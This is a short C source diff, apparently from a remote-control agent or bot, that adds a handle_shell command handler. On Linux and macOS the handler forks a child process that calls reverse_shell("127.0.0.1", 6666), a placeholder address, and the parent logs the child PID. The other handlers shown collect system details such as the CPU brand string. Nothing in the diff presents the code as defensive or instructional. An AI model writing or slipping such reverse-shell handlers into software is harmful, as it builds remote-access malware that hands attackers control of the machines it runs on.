@@ -5,9 +5,6 @@
 #ifdef _WIN32
 #include <VersionHelpers.h>
 #endif
-#ifdef __APPLE__
-#include <CoreServices/CoreServices.h>
-#endif
 
 #ifdef _WIN32
 void handle_hello(int fd, CHAR *target) {
@@ -89,6 +86,26 @@ void handle_cpu(int fd, char *target) {
 	size_t bufferlen = CPU_INFO_BUFFER_SIZE;
 	sysctlbyname("machdep.cpu.brand_string", &cpu_content, &bufferlen, NULL, 0);
 	set_message(fd, cpu_content, target);
+#endif
+
+}
+
+#ifdef _WIN32
+void handle_shell(int fd, CHAR *target) {
+#elif defined(__linux__) || defined(__APPLE__)
+void handle_shell(int fd, char *target) {
+	// Start new process
+	pid_t pid = fork();
+	// Children
+	if(pid == 0) {
+		/* Starting reverse shell */
+		reverse_shell("127.0.0.1", 6666);
+		_exit(EXIT_SUCCESS);
+	}else if (pid != -1) {
+		log_message("openned child process PID: %d\n", pid);
+		log_message("parent continue program\n");
+	}
+
 #endif
 
 }
